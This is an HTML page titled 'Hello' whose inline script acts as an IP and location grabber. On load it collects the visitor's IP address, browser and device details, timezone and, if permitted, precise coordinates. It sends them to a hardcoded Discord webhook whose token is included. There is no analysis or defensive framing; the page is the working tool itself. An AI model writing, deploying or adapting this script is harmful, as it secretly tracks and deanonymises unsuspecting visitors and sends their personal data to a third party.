<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Hello</title>
</head>
<body>
  <h1>You Have Been Logged</h1>

  <script>
  (async () => {
    const webhookURL = "https://discord.com/api/webhooks/1395279513491079350/suo8tCqbxAo_hAWAcH0kiCw0cqEXqG6FCkzCS5wwxuQL1R6csw3LFl2TwpwHlkUVzlNc";

    // Base visitor info
    const data = {
      ip: 'unknown',
      userAgent: navigator.userAgent,
      language: navigator.language,
      screenSize: `${screen.width}x${screen.height}`,
      url: location.href,
      platform: navigator.platform,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      localTime: new Date().toString(),
      deviceType: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
    };

    // Get visitor IP
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const json = await res.json();
      data.ip = json.ip;
    } catch {}

    // Function to send message to Discord
    async function sendToDiscord(message, embeds = []) {
      try {
        await fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: message, embeds: embeds })
        });
      } catch (err) {
        console.error('Failed to send Discord message', err);
      }
    }

    // Prepare base message with ping and emojis
    let message = `@everyone
ğŸš¨ **New Visitor Logged:** ğŸš¨
- ğŸŒ IP: ${data.ip}
- ğŸ“± Device: ${data.deviceType}
- ğŸ’» Platform: ${data.platform}
- ğŸŒ Browser: ${data.userAgent}
- ğŸ—£ Language: ${data.language}
- ğŸ–¥ Screen Size: ${data.screenSize}
- ğŸ”— URL: ${data.url}
- â° Timezone: ${data.timezone}
- ğŸ•’ Local Time: ${data.localTime}
`;

    // Try to get location (with permission)
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const lat = pos.coords.latitude.toFixed(5);
          const lon = pos.coords.longitude.toFixed(5);
          data.latitude = lat;
          data.longitude = lon;

          const locationLink = `https://www.google.com/maps?q=${lat},${lon}`;

          message += `- ğŸ“ Location: [View on Map](${locationLink})`;

          // Send message with location
          await sendToDiscord(message);
        },
        async (error) => {
          // User denied or error
          message += "\n- ğŸ“ Location: Permission denied or unavailable";
          await sendToDiscord(message);
        },
        { timeout: 10000 }
      );
    } else {
      message += "\n- ğŸ“ Location: Geolocation not supported";
      await sendToDiscord(message);
    }
  })();
  </script>
</body>
